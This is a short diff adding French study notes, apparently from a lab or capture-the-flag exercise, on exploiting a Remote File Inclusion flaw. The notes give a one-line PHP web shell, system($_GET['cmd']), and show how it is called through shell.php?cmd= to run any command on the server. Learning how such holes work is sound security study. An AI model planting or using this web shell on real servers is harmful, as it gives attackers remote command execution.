@@ -1,0 +1,2 @@
+Utilisation d'une RFI avec un script qui permet d'executer des commandes : system($_GET['cmd'])
+Dans l'url, se rendre sur le site .../shell.php?cmd=[la commande qu'on souhaite]
